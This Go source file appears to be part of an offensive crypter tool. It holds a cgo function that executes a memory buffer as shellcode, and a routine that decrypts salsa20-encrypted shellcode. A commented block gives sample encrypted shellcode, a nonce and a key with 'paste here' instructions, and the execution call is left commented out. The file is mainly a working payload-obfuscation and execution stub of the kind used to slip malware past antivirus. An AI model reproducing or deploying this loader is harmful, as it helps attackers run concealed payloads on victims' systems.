/*/
Uses code from:
https://snowscan.io/custom-crypter/
/*/

package CryptographicFunctions

/*
void call_shellcode(char *code) {
        int (*ret)() = (int(*)())code;
        ret();
}
*/
import "C"
import (
	"fmt"

	"golang.org/x/crypto/salsa20"
)

/*/

in := []byte{0x79, 0x46, 0x15, 0x27, 0xa6, 0xdb, 0xbc, 0x5, 0x84, 0x97, 0x83, 0x7c, 0x4f, 0xed, 0x81, 0xd, 0xf, 0x93, 0x8e, 0x7c, 0xd3, 0xa5, 0x74, 0x99, 0xaa, 0xcd, 0xbe, 0xd0, 0x49, 0x54, 0xce, 0x9d, 0xe7, 0x4a, 0x64, 0x95, 0xc3, 0x83, 0xb8, 0x58, 0x4a, 0xe4, 0x87, 0x49, 0xb3, 0x6e, 0x6a, 0x32, 0x76}

// Paste encrypted shellcode here
in := []byte{0x79, 0x46, 0x15, 0x27, 0xa6, 0xdb, 0xbc, 0x5, 0x84, 0x97, 0x83, 0x7c, 0x4f, 0xed, 0x81, 0xd, 0xf, 0x93, 0x8e, 0x7c, 0xd3, 0xa5, 0x74, 0x99, 0xaa, 0xcd, 0xbe, 0xd0, 0x49, 0x54, 0xce, 0x9d, 0xe7, 0x4a, 0x64, 0x95, 0xc3, 0x83, 0xb8, 0x58, 0x4a, 0xe4, 0x87, 0x49, 0xb3, 0x6e, 0x6a, 0x32, 0x76}

out := make([]byte, len(in))

// Paste nonce here
nonce := []byte{0xc6, 0x2f, 0xb2, 0xd1, 0x94, 0x7b, 0x47, 0xa6, 0x51, 0x5d, 0x57, 0xfb, 0x8a, 0x2c, 0x3e, 0x7f, 0x43, 0x5a, 0xfc, 0xbb, 0x24, 0x4d, 0xc7, 0xbc}

// Paste key here
key := [32]byte{0x24, 0x90, 0xef, 0x80, 0x66, 0xee, 0xda, 0x52, 0xfa, 0xb9, 0x8, 0x37, 0x3f, 0x8e, 0x1c, 0x3b, 0x0, 0xec, 0x7, 0x19, 0x5a, 0x1f, 0x94, 0xe7, 0x2e, 0xdf, 0xee, 0x8d, 0x9, 0x63, 0xe4, 0xb5}


/*/

// bytes_in is shellcode
//     []byte { 0x79,0x46,0x15,0x27,...
func ShellCodeDecrypter(bytes_in []byte, nonce []byte, key *[32]byte) {

	out := make([]byte, len(bytes_in))

	salsa20.XORKeyStream(out, bytes_in, nonce, key)
	for _, element := range out {
		fmt.Printf("%#x,", element)
	}
	// this is how to execute the shellcode
	//C.call_shellcode((*C.char)(unsafe.Pointer(&out[0])))
}
